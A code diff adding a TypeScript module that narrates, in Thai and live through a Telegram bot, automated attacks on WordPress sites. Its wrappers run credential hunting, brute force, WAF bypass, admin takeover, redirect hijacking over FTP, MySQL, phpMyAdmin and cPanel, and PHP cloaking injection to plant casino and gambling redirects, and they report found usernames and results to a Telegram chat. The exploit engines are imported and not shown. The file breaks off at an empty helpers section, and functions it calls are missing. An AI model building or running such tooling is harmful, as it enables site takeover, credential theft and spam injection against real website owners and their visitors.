@@ -1,0 +1,1090 @@
+/**
+ * TelegramNarrator — Real-time Thai step-by-step attack narration
+ * 
+ * แสดงผลแบบ Manus-style: ทุก step มี icon + label, 
+ * ระหว่าง steps มีวิเคราะห์เป็นภาษาไทย, 
+ * อัปเดตข้อความเดิมแบบ progressive
+ */
+
+// ═══════════════════════════════════════════════════════
+//  Types
+// ═══════════════════════════════════════════════════════
+
+export interface NarratorStep {
+  /** Step label (shown in ▶ badge) */
+  label: string;
+  /** Status of this step */
+  status: "pending" | "running" | "done" | "failed" | "skipped";
+  /** Thai analysis text shown after step completes */
+  analysis?: string;
+  /** Duration in ms */
+  durationMs?: number;
+  /** Extra data (e.g., found credentials, open ports) */
+  data?: Record<string, any>;
+}
+
+export interface NarratorConfig {
+  /** Target domain */
+  domain: string;
+  /** Attack method name */
+  method: string;
+  /** Telegram bot token */
+  botToken: string;
+  /** Chat ID to send messages */
+  chatId: number;
+  /** Optional: existing message ID to edit (if not provided, creates new) */
+  messageId?: number;
+  /** Max message length before splitting (Telegram limit ~4096) */
+  maxLength?: number;
+}
+
+export type NarratorPhase = 
+  | "recon"        // สำรวจเป้าหมาย
+  | "credential"   // ค้นหา credentials
+  | "bruteforce"   // brute force
+  | "exploit"      // exploit ช่องโหว่
+  | "upload"       // อัปโหลดไฟล์
+  | "inject"       // inject code
+  | "hijack"       // hijack redirect
+  | "verify"       // ตรวจสอบผล
+  | "complete"     // เสร็จสิ้น
+  | "error";       // ข้อผิดพลาด
+
+// ═══════════════════════════════════════════════════════
+//  Phase Labels (Thai)
+// ═══════════════════════════════════════════════════════
+
+const PHASE_LABELS: Record<NarratorPhase, { emoji: string; thai: string }> = {
+  recon:      { emoji: "🔍", thai: "สำรวจเป้าหมาย" },
+  credential: { emoji: "🔑", thai: "ค้นหา Credentials" },
+  bruteforce: { emoji: "🔨", thai: "Brute Force" },
+  exploit:    { emoji: "💉", thai: "Exploit ช่องโหว่" },
+  upload:     { emoji: "📤", thai: "อัปโหลดไฟล์" },
+  inject:     { emoji: "💊", thai: "Inject โค้ด" },
+  hijack:     { emoji: "🔓", thai: "Hijack Redirect" },
+  verify:     { emoji: "✅", thai: "ตรวจสอบผลลัพธ์" },
+  complete:   { emoji: "🏁", thai: "เสร็จสิ้น" },
+  error:      { emoji: "❌", thai: "ข้อผิดพลาด" },
+};
+
+// ═══════════════════════════════════════════════════════
+//  Status Icons
+// ═══════════════════════════════════════════════════════
+
+const STATUS_ICON: Record<NarratorStep["status"], string> = {
+  pending:  "⬜",
+  running:  "▶",
+  done:     "✅",
+  failed:   "❌",
+  skipped:  "⏭",
+};
+
+// ═══════════════════════════════════════════════════════
+//  Thai Analysis Templates
+// ═══════════════════════════════════════════════════════
+
+export function generateReconAnalysis(data: {
+  httpStatus?: number;
+  isWordPress?: boolean;
+  wpVersion?: string;
+  themes?: string[];
+  plugins?: string[];
+  hasXmlrpc?: boolean;
+  hasRestApi?: boolean;
+  server?: string;
+  waf?: string;
+  openPorts?: number[];
+  cloudflare?: boolean;
+}): string {
+  const parts: string[] = [];
+
+  if (data.httpStatus) {
+    parts.push(`เว็บไซต์ตอบสนอง HTTP ${data.httpStatus}`);
+  }
+
+  if (data.isWordPress === true) {
+    parts.push(`ยืนยันว่าใช้ WordPress${data.wpVersion ? ` เวอร์ชัน ${data.wpVersion}` : ""}`);
+    if (data.themes?.length) {
+      parts.push(`ธีม: ${data.themes.join(", ")}`);
+    }
+    if (data.plugins?.length) {
+      parts.push(`ปลั๊กอิน: ${data.plugins.slice(0, 5).join(", ")}${data.plugins.length > 5 ? ` (+${data.plugins.length - 5} อื่นๆ)` : ""}`);
+    }
+  } else if (data.isWordPress === false) {
+    parts.push("ไม่พบสัญญาณ WordPress ชัดเจน");
+  }
+
+  if (data.hasXmlrpc) {
+    parts.push("พบ xmlrpc.php — สามารถใช้ multicall brute force ได้");
+  }
+  if (data.hasRestApi) {
+    parts.push("พบ REST API endpoint — สามารถ enumerate users ได้");
+  }
+
+  if (data.cloudflare) {
+    parts.push("อยู่หลัง Cloudflare — ต้องใช้เทคนิค bypass");
+  }
+  if (data.waf) {
+    parts.push(`ตรวจพบ WAF: ${data.waf}`);
+  }
+
+  if (data.openPorts?.length) {
+    const portNames: Record<number, string> = { 21: "FTP", 22: "SSH", 2082: "cPanel", 2083: "cPanel SSL", 3306: "MySQL", 8080: "PHPMyAdmin", 8443: "PHPMyAdmin SSL" };
+    const named = data.openPorts.map(p => portNames[p] ? `${portNames[p]}(${p})` : String(p));
+    parts.push(`พอร์ตที่เปิด: ${named.join(", ")}`);
+  }
+
+  if (parts.length === 0) return "กำลังรวบรวมข้อมูลเพิ่มเติม...";
+  return parts.join(" | ");
+}
+
+export function generateCredentialAnalysis(data: {
+  usersFound?: string[];
+  techniquesUsed?: number;
+  techniquesSucceeded?: number;
+  credentialsFound?: number;
+  methods?: string[];
+}): string {
+  const parts: string[] = [];
+
+  if (data.usersFound?.length) {
+    parts.push(`พบ ${data.usersFound.length} ผู้ใช้: ${data.usersFound.slice(0, 5).join(", ")}`);
+  }
+  if (data.techniquesUsed) {
+    parts.push(`ใช้ ${data.techniquesSucceeded || 0}/${data.techniquesUsed} เทคนิคสำเร็จ`);
+  }
+  if (data.credentialsFound) {
+    parts.push(`สร้าง ${data.credentialsFound} ชุด credentials สำหรับทดสอบ`);
+  }
+  if (data.methods?.length) {
+    parts.push(`วิธี: ${data.methods.join(", ")}`);
+  }
+
+  return parts.length > 0 ? parts.join(" | ") : "กำลังค้นหา credentials...";
+}
+
+export function generateBruteForceAnalysis(data: {
+  totalPasswords?: number;
+  testedCount?: number;
+  speed?: number;
+  method?: string;
+  found?: boolean;
+  username?: string;
+}): string {
+  const parts: string[] = [];
+
+  if (data.method) {
+    parts.push(`ใช้ ${data.method}`);
+  }
+  if (data.totalPasswords && data.testedCount) {
+    const pct = Math.round((data.testedCount / data.totalPasswords) * 100);
+    parts.push(`ทดสอบแล้ว ${data.testedCount}/${data.totalPasswords} (${pct}%)`);
+  }
+  if (data.speed) {
+    parts.push(`ความเร็ว: ${data.speed} passwords/sec`);
+  }
+  if (data.found && data.username) {
+    parts.push(`พบรหัสผ่านของ ${data.username}!`);
+  }
+
+  return parts.length > 0 ? parts.join(" | ") : "กำลัง brute force...";
+}
+
+export function generateUploadAnalysis(data: {
+  method?: string;
+  path?: string;
+  statusCode?: number;
+  success?: boolean;
+  fileUrl?: string;
+}): string {
+  const parts: string[] = [];
+
+  if (data.method) {
+    parts.push(`วิธี: ${data.method}`);
+  }
+  if (data.path) {
+    parts.push(`เส้นทาง: ${data.path}`);
+  }
+  if (data.statusCode) {
+    parts.push(`HTTP ${data.statusCode}`);
+  }
+  if (data.success && data.fileUrl) {
+    parts.push(`อัปโหลดสำเร็จ: ${data.fileUrl.substring(0, 60)}`);
+  } else if (data.success === false) {
+    parts.push("อัปโหลดไม่สำเร็จ");
+  }
+
+  return parts.length > 0 ? parts.join(" | ") : "กำลังอัปโหลด...";
+}
+
+export function generateHijackAnalysis(data: {
+  method?: string;
+  success?: boolean;
+  detail?: string;
+  originalUrl?: string;
+  newUrl?: string;
+}): string {
+  const parts: string[] = [];
+
+  if (data.method) {
+    parts.push(`วิธี: ${data.method}`);
+  }
+  if (data.detail) {
+    parts.push(data.detail);
+  }
+  if (data.success && data.newUrl) {
+    parts.push(`เปลี่ยน redirect เป็น ${data.newUrl.substring(0, 50)} สำเร็จ`);
+  }
+  if (data.originalUrl) {
+    parts.push(`redirect เดิม: ${data.originalUrl.substring(0, 50)}`);
+  }
+
+  return parts.length > 0 ? parts.join(" | ") : "กำลัง hijack...";
+}
+
+export function generateVerifyAnalysis(data: {
+  redirectWorks?: boolean;
+  redirectUrl?: string;
+  cloakingWorks?: boolean;
+  normalSiteWorks?: boolean;
+  fileAccessible?: boolean;
+}): string {
+  const parts: string[] = [];
+
+  if (data.redirectWorks !== undefined) {
+    parts.push(`Redirect: ${data.redirectWorks ? "✅ ทำงาน" : "❌ ไม่ทำงาน"}`);
+  }
+  if (data.redirectUrl) {
+    parts.push(`ปลายทาง: ${data.redirectUrl.substring(0, 50)}`);
+  }
+  if (data.cloakingWorks !== undefined) {
+    parts.push(`Cloaking: ${data.cloakingWorks ? "✅ ซ่อนได้" : "❌ ไม่ซ่อน"}`);
+  }
+  if (data.normalSiteWorks !== undefined) {
+    parts.push(`เว็บปกติ: ${data.normalSiteWorks ? "✅ ยังเข้าได้" : "⚠️ มีปัญหา"}`);
+  }
+  if (data.fileAccessible !== undefined) {
+    parts.push(`ไฟล์: ${data.fileAccessible ? "✅ เข้าถึงได้" : "❌ เข้าไม่ได้"}`);
+  }
+
+  return parts.length > 0 ? parts.join(" | ") : "กำลังตรวจสอบ...";
+}
+
+// ═══════════════════════════════════════════════════════
+//  TelegramNarrator Class
+// ═══════════════════════════════════════════════════════
+
+export class TelegramNarrator {
+  private config: NarratorConfig;
+  private steps: NarratorStep[] = [];
+  private currentPhase: NarratorPhase = "recon";
+  private messageId: number | null;
+  private startTime: number;
+  private lastEditTime: number = 0;
+  private editQueue: Promise<void> = Promise.resolve();
+  private phaseAnalysis: Map<string, string> = new Map();
+  
+  /** Minimum interval between edits (ms) to avoid Telegram rate limits */
+  private static MIN_EDIT_INTERVAL = 1500;
+
+  constructor(config: NarratorConfig) {
+    this.config = config;
+    this.messageId = config.messageId || null;
+    this.startTime = Date.now();
+  }
+
+  // ─── Public API ───
+
+  /** Initialize narrator — sends first message */
+  async init(): Promise<number | null> {
+    const header = this.buildHeader();
+    const text = `${header}\n\n⏳ กำลังเตรียมพร้อม...`;
+    
+    if (this.messageId) {
+      await this.editMessage(text);
+    } else {
+      this.messageId = await this.sendAndGetId(text);
+    }
+    return this.messageId;
+  }
+
+  /** Start a new phase */
+  async startPhase(phase: NarratorPhase, customLabel?: string): Promise<void> {
+    this.currentPhase = phase;
+    const phaseInfo = PHASE_LABELS[phase];
+    const label = customLabel || `${phaseInfo.emoji} ${phaseInfo.thai}`;
+    
+    this.steps.push({
+      label,
+      status: "running",
+    });
+    
+    await this.updateMessage();
+  }
+
+  /** Add a sub-step within current phase */
+  async addStep(label: string, status: NarratorStep["status"] = "running"): Promise<number> {
+    const idx = this.steps.length;
+    this.steps.push({ label, status });
+    await this.updateMessage();
+    return idx;
+  }
+
+  /** Update a step's status and optionally add analysis */
+  async updateStep(index: number, status: NarratorStep["status"], analysis?: string, durationMs?: number): Promise<void> {
+    if (index >= 0 && index < this.steps.length) {
+      this.steps[index].status = status;
+      if (analysis) this.steps[index].analysis = analysis;
+      if (durationMs !== undefined) this.steps[index].durationMs = durationMs;
+    }
+    await this.updateMessage();
+  }
+
+  /** Complete the last step and add analysis */
+  async completeLastStep(status: NarratorStep["status"], analysis?: string, durationMs?: number): Promise<void> {
+    const lastIdx = this.steps.length - 1;
+    if (lastIdx >= 0) {
+      await this.updateStep(lastIdx, status, analysis, durationMs);
+    }
+  }
+
+  /** Add analysis text for current phase (shown between steps) */
+  async addAnalysis(text: string): Promise<void> {
+    const key = `analysis_${this.steps.length}`;
+    this.phaseAnalysis.set(key, text);
+    await this.updateMessage();
+  }
+
+  /** Mark attack as complete with final summary */
+  async complete(success: boolean, summary: string): Promise<void> {
+    this.currentPhase = "complete";
+    const elapsed = Date.now() - this.startTime;
+    
+    const finalText = this.buildFinalMessage(success, summary, elapsed);
+    await this.editMessage(finalText);
+    
+    // Send separate notification (edit doesn't trigger push)
+    const notifIcon = success ? "✅" : "❌";
+    const notifText = `🔔 ${success ? "สำเร็จ" : "ล้มเหลว"}!\n\n${notifIcon} ${this.config.domain}\n📋 ${summary}\n⏱ ${formatDurationThai(elapsed)}`;
+    await this.sendMessage(notifText);
+  }
+
+  /** Mark attack as failed with error */
+  async fail(error: string): Promise<void> {
+    this.currentPhase = "error";
+    const elapsed = Date.now() - this.startTime;
+    
+    // Mark last running step as failed
+    const lastRunning = this.steps.findLastIndex(s => s.status === "running");
+    if (lastRunning >= 0) {
+      this.steps[lastRunning].status = "failed";
+      this.steps[lastRunning].analysis = error;
+    }
+    
+    const finalText = this.buildFinalMessage(false, error, elapsed);
+    await this.editMessage(finalText);
+    
+    await this.sendMessage(
+      `🔔 โจมตีล้มเหลว\n\n❌ ${this.config.domain}\n⚠️ ${error.substring(0, 100)}\n⏱ ${formatDurationThai(elapsed)}`
+    );
+  }
+
+  /** Get current message ID */
+  getMessageId(): number | null {
+    return this.messageId;
+  }
+
+  /** Get elapsed time */
+  getElapsed(): number {
+    return Date.now() - this.startTime;
+  }
+
+  // ─── Message Building ───
+
+  private buildHeader(): string {
+    const phaseInfo = PHASE_LABELS[this.currentPhase];
+    const elapsed = Date.now() - this.startTime;
+    return `⚔️ โจมตี: ${this.config.domain}\n${phaseInfo.emoji} ${phaseInfo.thai} | ⏱ ${formatDurationThai(elapsed)}`;
+  }
+
+  private buildStepsText(): string {
+    let text = "";
+    
+    for (let i = 0; i < this.steps.length; i++) {
+      const step = this.steps[i];
+      const icon = STATUS_ICON[step.status];
+      const duration = step.durationMs ? ` (${formatDurationThai(step.durationMs)})` : "";
+      
+      text += `\n${icon} ${step.label}${duration}`;
+      
+      // Show analysis after completed/failed steps
+      if (step.analysis && (step.status === "done" || step.status === "failed")) {
+        text += `\n   └─ ${step.analysis}`;
+      }
+      
+      // Show phase analysis between steps
+      const analysisKey = `analysis_${i + 1}`;
+      const analysis = this.phaseAnalysis.get(analysisKey);
+      if (analysis) {
+        text += `\n\n${analysis}\n`;
+      }
+    }
+    
+    return text;
+  }
+
+  private buildProgressBar(): string {
+    const total = this.steps.length;
+    const done = this.steps.filter(s => s.status === "done" || s.status === "skipped").length;
+    const failed = this.steps.filter(s => s.status === "failed").length;
+    const running = this.steps.filter(s => s.status === "running").length;
+    
+    if (total === 0) return "";
+    
+    const pct = Math.round(((done + failed) / Math.max(total, 1)) * 100);
+    const barLen = 10;
+    const filled = Math.round((pct / 100) * barLen);
+    const bar = "█".repeat(filled) + "░".repeat(barLen - filled);
+    
+    let statusText = "";
+    if (running > 0) {
+      const spinner = buildSpinner(Date.now() - this.startTime);
+      statusText = `${spinner} กำลังทำงาน...`;
+    } else if (failed > 0 && done === 0) {
+      statusText = "❌ ล้มเหลว";
+    } else {
+      statusText = `✅ ${done}/${total} สำเร็จ`;
+    }
+    
+    return `\n[${bar}] ${pct}% ${statusText}`;
+  }
+
+  private buildCurrentMessage(): string {
+    const header = this.buildHeader();
+    const progress = this.buildProgressBar();
+    const steps = this.buildStepsText();
+    
+    let text = `${header}${progress}\n${steps}`;
+    
+    // Trim to Telegram limit
+    const maxLen = this.config.maxLength || 4000;
+    if (text.length > maxLen) {
+      // Keep header + last N steps
+      const headerPart = `${header}${progress}\n\n... (ข้ามขั้นตอนก่อนหน้า)\n`;
+      const remaining = maxLen - headerPart.length;
+      const stepsLines = steps.split("\n");
+      let trimmedSteps = "";
+      for (let i = stepsLines.length - 1; i >= 0; i--) {
+        const candidate = stepsLines[i] + "\n" + trimmedSteps;
+        if (candidate.length > remaining) break;
+        trimmedSteps = candidate;
+      }
+      text = headerPart + trimmedSteps;
+    }
+    
+    return text;
+  }
+
+  private buildFinalMessage(success: boolean, summary: string, elapsed: number): string {
+    const icon = success ? "✅" : "❌";
+    const statusText = success ? "สำเร็จ" : "ล้มเหลว";
+    
+    let text = `${icon} โจมตี${statusText}: ${this.config.domain}\n`;
+    text += `📋 Method: ${this.config.method}\n`;
+    text += `⏱ รวมเวลา: ${formatDurationThai(elapsed)}\n`;
+    text += `\n━━━━━━━━━━━━━━━━━━━━\n`;
+    
+    // All steps summary
+    for (const step of this.steps) {
+      const icon = STATUS_ICON[step.status];
+      const duration = step.durationMs ? ` (${formatDurationThai(step.durationMs)})` : "";
+      text += `${icon} ${step.label}${duration}\n`;
+      if (step.analysis) {
+        text += `   └─ ${step.analysis}\n`;
+      }
+    }
+    
+    text += `\n━━━━━━━━━━━━━━━━━━━━\n`;
+    text += `📝 สรุป: ${summary}`;
+    
+    // Trim
+    if (text.length > 4000) {
+      text = text.substring(0, 3990) + "\n...";
+    }
+    
+    return text;
+  }
+
+  // ─── Telegram API ───
+
+  private async updateMessage(): Promise<void> {
+    // Queue edits to respect rate limits
+    this.editQueue = this.editQueue.then(async () => {
+      const now = Date.now();
+      const timeSinceLastEdit = now - this.lastEditTime;
+      
+      if (timeSinceLastEdit < TelegramNarrator.MIN_EDIT_INTERVAL) {
+        await sleep(TelegramNarrator.MIN_EDIT_INTERVAL - timeSinceLastEdit);
+      }
+      
+      const text = this.buildCurrentMessage();
+      await this.editMessage(text);
+      this.lastEditTime = Date.now();
+    }).catch(() => {
+      // Silently ignore edit errors
+    });
+  }
+
+  private async editMessage(text: string): Promise<boolean> {
+    if (!this.messageId) return false;
+    
+    try {
+      const url = `https://api.telegram.org/bot${this.config.botToken}/editMessageText`;
+      
+      // Try plain text (more reliable than Markdown for complex messages)
+      const resp = await fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: this.config.chatId,
+          message_id: this.messageId,
+          text,
+        }),
+        signal: AbortSignal.timeout(10000),
+      });
+      const result = await resp.json() as any;
+      return result.ok === true;
+    } catch {
+      return false;
+    }
+  }
+
+  private async sendMessage(text: string): Promise<boolean> {
+    try {
+      const url = `https://api.telegram.org/bot${this.config.botToken}/sendMessage`;
+      const resp = await fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: this.config.chatId,
+          text,
+        }),
+        signal: AbortSignal.timeout(10000),
+      });
+      const result = await resp.json() as any;
+      return result.ok === true;
+    } catch {
+      return false;
+    }
+  }
+
+  private async sendAndGetId(text: string): Promise<number | null> {
+    try {
+      const url = `https://api.telegram.org/bot${this.config.botToken}/sendMessage`;
+      const resp = await fetch(url, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: this.config.chatId,
+          text,
+        }),
+        signal: AbortSignal.timeout(10000),
+      });
+      const result = await resp.json() as any;
+      return result.ok ? result.result.message_id : null;
+    } catch {
+      return null;
+    }
+  }
+}
+
+// ═══════════════════════════════════════════════════════
+//  Narrated Attack Runners
+//  — Wrap each attack method with TelegramNarrator
+// ═══════════════════════════════════════════════════════
+
+export interface NarratedAttackOptions {
+  domain: string;
+  method: string;
+  botToken: string;
+  chatId: number;
+  redirectUrl: string;
+}
+
+/**
+ * Run full_chain attack with Thai narration
+ */
+export async function narrateFullChainAttack(opts: NarratedAttackOptions): Promise<{
+  narrator: TelegramNarrator;
+  success: boolean;
+  result: any;
+}> {
+  const narrator = new TelegramNarrator({
+    domain: opts.domain,
+    method: "full_chain",
+    botToken: opts.botToken,
+    chatId: opts.chatId,
+  });
+  
+  await narrator.init();
+  
+  // Phase 1: Recon
+  await narrator.startPhase("recon");
+  const reconStep = await narrator.addStep("ตรวจสอบเป้าหมาย + CMS detection");
+  
+  const { runUnifiedAttackPipeline } = await import("./unified-attack-pipeline");
+  
+  let lastPhase = "";
+  let pipelineResult: any;
+  
+  try {
+    pipelineResult = await runUnifiedAttackPipeline(
+      {
+        targetUrl: `https://${opts.domain}`,
+        redirectUrl: opts.redirectUrl,
+        seoKeywords: ["casino", "gambling", "slots"],
+        enableCloaking: true,
+        enableWafBypass: true,
+        enableAltUpload: true,
+        enableIndirectAttacks: true,
+        enableDnsAttacks: true,
+        enableConfigExploit: true,
+        enableWpAdminTakeover: true,
+        enableWpDbInjection: true,
+        enableAiCommander: true,
+        enableComprehensiveAttacks: true,
+        enablePostUpload: true,
+        userId: 1,
+        globalTimeout: 10 * 60 * 1000,
+      },
+      async (event) => {
+        // Map pipeline phases to narrator steps
+        if (event.phase !== lastPhase) {
+          // Complete previous step
+          if (lastPhase) {
+            await narrator.completeLastStep(
+              event.detail.includes("❌") ? "failed" : "done",
+              mapPhaseToThaiAnalysis(lastPhase, event.detail)
+            );
+          }
+          
+          lastPhase = event.phase;
+          const thaiLabel = mapPhaseToThaiLabel(event.phase);
+          await narrator.addStep(thaiLabel);
+        }
+        
+        // Add analysis for significant events
+        if (event.detail && event.detail.length > 10) {
+          const thaiDetail = mapDetailToThai(event.phase, event.detail);
+          if (thaiDetail) {
+            await narrator.addAnalysis(thaiDetail);
+          }
+        }
+      },
+    );
+    
+    // Complete last step
+    if (lastPhase) {
+      await narrator.completeLastStep("done");
+    }
+    
+    const verifiedFiles = pipelineResult.uploadedFiles.filter((f: any) => f.redirectWorks && f.redirectDestinationMatch);
+    const success = pipelineResult.success || verifiedFiles.length > 0;
+    
+    // Verification phase
+    await narrator.startPhase("verify");
+    const verifyStep = await narrator.addStep("ตรวจสอบ redirect ทำงานหรือไม่");
+    
+    if (verifiedFiles.length > 0) {
+      await narrator.updateStep(verifyStep, "done",
+        generateVerifyAnalysis({
+          redirectWorks: true,
+          redirectUrl: verifiedFiles[0].url,
+          fileAccessible: true,
+        })
+      );
+    } else {
+      await narrator.updateStep(verifyStep, "failed",
+        generateVerifyAnalysis({
+          redirectWorks: false,
+          fileAccessible: pipelineResult.uploadedFiles.length > 0,
+        })
+      );
+    }
+    
+    // Complete
+    const summary = success
+      ? `วาง redirect สำเร็จ ${verifiedFiles.length} ไฟล์ จาก ${pipelineResult.uploadAttempts} ครั้ง`
+      : `ลองแล้ว ${pipelineResult.uploadAttempts} ครั้ง ไม่สำเร็จ — ${pipelineResult.errors.slice(0, 2).join(", ")}`;
+    
+    await narrator.complete(success, summary);
+    
+    return { narrator, success, result: pipelineResult };
+    
+  } catch (error: any) {
+    await narrator.fail(error.message);
+    return { narrator, success: false, result: null };
+  }
+}
+
+/**
+ * Run hijack_redirect attack with Thai narration
+ */
+export async function narrateHijackAttack(opts: NarratedAttackOptions & {
+  credentials?: Array<{ username: string; password: string }>;
+}): Promise<{
+  narrator: TelegramNarrator;
+  success: boolean;
+  result: any;
+}> {
+  const narrator = new TelegramNarrator({
+    domain: opts.domain,
+    method: "hijack_redirect",
+    botToken: opts.botToken,
+    chatId: opts.chatId,
+  });
+  
+  await narrator.init();
+  
+  // Phase 1: Credential Hunt
+  await narrator.startPhase("credential");
+  const credStep = await narrator.addStep("🔑 AI Credential Hunter ค้นหา credentials");
+  
+  let huntedCreds: Array<{ username: string; password: string }> = opts.credentials || [];
+  
+  if (!opts.credentials?.length) {
+    try {
+      const { executeCredentialHunt } = await import("./ai-credential-hunter");
+      const huntResult = await executeCredentialHunt({
+        domain: opts.domain,
+        maxDurationMs: 45_000,
+        onProgress: async (phase, detail) => {
+          // Add sub-steps for each credential hunting technique
+          await narrator.addStep(`🔑 ${detail.substring(0, 60)}`);
+        },
+      });
+      
+      huntedCreds = huntResult.credentials.slice(0, 100).map(c => ({ username: c.username, password: c.password }));
+      
+      await narrator.completeLastStep("done",
+        generateCredentialAnalysis({
+          usersFound: huntResult.enumeratedUsers,
+          techniquesUsed: huntResult.techniques.length,
+          techniquesSucceeded: huntResult.techniques.filter(t => t.status === "success").length,
+          credentialsFound: huntResult.credentials.length,
+        }),
+        Date.now() - narrator.getElapsed()
+      );
+    } catch (err: any) {
+      await narrator.updateStep(credStep, "failed", `CredHunter error: ${err.message}`);
+    }
+  } else {
+    await narrator.updateStep(credStep, "done", `ใช้ ${huntedCreds.length} credentials ที่มีอยู่แล้ว`);
+  }
+  
+  // Phase 2: Port Scan + Hijack
+  await narrator.startPhase("hijack");
+  const scanStep = await narrator.addStep("🔌 สแกนพอร์ต (FTP, MySQL, PHPMyAdmin, cPanel)");
+  
+  try {
+    const { executeHijackRedirect } = await import("./hijack-redirect-engine");
+    
+    const hijackResult = await executeHijackRedirect({
+      targetDomain: opts.domain,
+      newRedirectUrl: opts.redirectUrl,
+      credentials: huntedCreds.length > 0 ? huntedCreds : undefined,
+    }, async (phase, detail, methodIndex, totalMethods) => {
+      // Add step for each method tried
+      const methodLabel = mapHijackMethodToThai(phase);
+      await narrator.addStep(`${methodLabel}: ${detail.substring(0, 60)}`);
+    });
+    
+    // Complete scan step with port info
+    const p = hijackResult.portsOpen;
+    await narrator.updateStep(scanStep, "done",
+      generateReconAnalysis({
+        openPorts: [
+          ...(p.ftp ? [21] : []),
+          ...(p.mysql ? [3306] : []),
+          ...(p.pma ? [8080] : []),
+          ...(p.cpanel ? [2083] : []),
+        ],
+      })
+    );
+    
+    // Log each method result
+    for (const mr of hijackResult.methodResults) {
+      await narrator.addStep(
+        `${mr.success ? "✅" : "❌"} ${mapHijackMethodToThai(mr.method)}`
+      );
+      await narrator.completeLastStep(
+        mr.success ? "done" : "failed",
+        generateHijackAnalysis({
+          method: mr.methodLabel,
+          success: mr.success,
+          detail: mr.detail.substring(0, 80),
+        }),
+        mr.durationMs
+      );
+    }
+    
+    // Complete
+    const summary = hijackResult.success
+      ? `Hijack สำเร็จด้วย ${hijackResult.winningMethod} — redirect ไป ${opts.redirectUrl}`
+      : `ลอง ${hijackResult.methodResults.length} วิธี ไม่สำเร็จ`;
+    
+    await narrator.complete(hijackResult.success, summary);
+    
+    return { narrator, success: hijackResult.success, result: hijackResult };
+    
+  } catch (error: any) {
+    await narrator.fail(error.message);
+    return { narrator, success: false, result: null };
+  }
+}
+
+/**
+ * Run scan_only with Thai narration
+ */
+export async function narrateScanAttack(opts: Omit<NarratedAttackOptions, "redirectUrl">): Promise<{
+  narrator: TelegramNarrator;
+  success: boolean;
+  result: any;
+}> {
+  const narrator = new TelegramNarrator({
+    domain: opts.domain,
+    method: "scan_only",
+    botToken: opts.botToken,
+    chatId: opts.chatId,
+  });
+  
+  await narrator.init();
+  await narrator.startPhase("recon");
+  
+  const step1 = await narrator.addStep("ตรวจสอบ HTTP response + headers");
+  const step2Idx = -1;
+  
+  try {
+    const { analyzeDomain } = await import("./seo-engine");
+    const s1 = Date.now();
+    const analysis = await analyzeDomain(opts.domain, "gambling");
+    const dur = Date.now() - s1;
+    
+    await narrator.updateStep(step1, "done",
+      generateReconAnalysis({
+        httpStatus: 200,
+        isWordPress: undefined,
+      }),
+      dur
+    );
+    
+    // Step 2: WP endpoints
+    const step2 = await narrator.addStep("ตรวจสอบ WP endpoints (xmlrpc, REST API, wp-admin)");
+    await narrator.updateStep(step2, "done",
+      `DA:${analysis.currentState.estimatedDA} | DR:${analysis.currentState.estimatedDR} | Backlinks:${analysis.currentState.estimatedBacklinks}`
+    );
+    
+    // Step 3: Index check
+    const step3 = await narrator.addStep("ตรวจสอบ Google Index");
+    await narrator.updateStep(step3, "done",
+      `Indexed: ${analysis.currentState.isIndexed ? "✅ อยู่ใน Google" : "❌ ไม่อยู่ใน Google"}`
+    );
+    
+    // Analysis
+    await narrator.addAnalysis(
+      `พบว่าเว็บไซต์ ${opts.domain} มี DA=${analysis.currentState.estimatedDA} DR=${analysis.currentState.estimatedDR} ` +
+      `มี backlinks ประมาณ ${analysis.currentState.estimatedBacklinks} ` +
+      `${analysis.currentState.isIndexed ? "อยู่ใน Google index แล้ว" : "ยังไม่อยู่ใน Google index"} ` +
+      `ควรตรวจสอบเพิ่มเติมว่าใช้ CMS อะไร เพื่อเลือกวิธีโจมตีที่เหมาะสม`
+    );
+    
+    await narrator.complete(true,
+      `Scan เสร็จ: DA=${analysis.currentState.estimatedDA} DR=${analysis.currentState.estimatedDR} BL=${analysis.currentState.estimatedBacklinks}`
+    );
+    
+    return { narrator, success: true, result: analysis };
+    
+  } catch (error: any) {
+    await narrator.fail(error.message);
+    return { narrator, success: false, result: null };
+  }
+}
+
+/**
+ * Run cloaking_inject with Thai narration
+ */
+export async function narrateCloakingAttack(opts: NarratedAttackOptions): Promise<{
+  narrator: TelegramNarrator;
+  success: boolean;
+  result: any;
+}> {
+  const narrator = new TelegramNarrator({
+    domain: opts.domain,
+    method: "cloaking_inject",
+    botToken: opts.botToken,
+    chatId: opts.chatId,
+  });
+  
+  await narrator.init();
+  
+  // Phase 1: Prepare
+  await narrator.startPhase("inject", "💊 PHP Cloaking Injection");
+  const prepStep = await narrator.addStep("เตรียม redirect URL + external JS");
+  await narrator.updateStep(prepStep, "done", `Redirect: ${opts.redirectUrl.substring(0, 50)}`);
+  
+  // Phase 2: Inject
+  const injectStep = await narrator.addStep("Inject Accept-Language cloaking code");
+  
+  try {
+    const { executePhpInjectionAttack } = await import("./wp-php-injection-engine");
+    
+    const injectionResult = await executePhpInjectionAttack({
+      targetUrl: `https://${opts.domain}`,
+      redirectUrl: opts.redirectUrl,
+      targetLanguages: ["th", "vi"],
+      brandName: "casino",
+    }, async (detail) => {
+      await narrator.addStep(detail.substring(0, 60));
+    });
+    
+    // Update inject step
+    await narrator.updateStep(injectStep, injectionResult.success ? "done" : "failed",
+      `Method: ${injectionResult.method} | ${injectionResult.details.substring(0, 60)}`
+    );
+    
+    // Verification
+    if (injectionResult.verificationResult) {
+      await narrator.startPhase("verify");
+      const verifyStep = await narrator.addStep("ตรวจสอบ cloaking ทำงานหรือไม่");
+      const v = injectionResult.verificationResult;
+      await narrator.updateStep(verifyStep, v.cloakingWorks ? "done" : "failed",
+        generateVerifyAnalysis({
+          redirectWorks: v.redirectWorks,
+          cloakingWorks: v.cloakingWorks,
+          normalSiteWorks: v.normalSiteWorks,
+        })
+      );
+    }
+    
+    const summary = injectionResult.success
+      ? `Cloaking inject สำเร็จด้วย ${injectionResult.method}`
+      : `ลอง inject ไม่สำเร็จ: ${injectionResult.errors.slice(0, 2).join(", ")}`;
+    
+    await narrator.complete(injectionResult.success, summary);
+    
+    return { narrator, success: injectionResult.success, result: injectionResult };
+    
+  } catch (error: any) {
+    await narrator.fail(error.message);
+    return { narrator, success: false, result: null };
+  }
+}
+
+// ═══════════════════════════════════════════════════════
+//  Helper Functions
+// ═══════════════════════════════════════════════════════
+
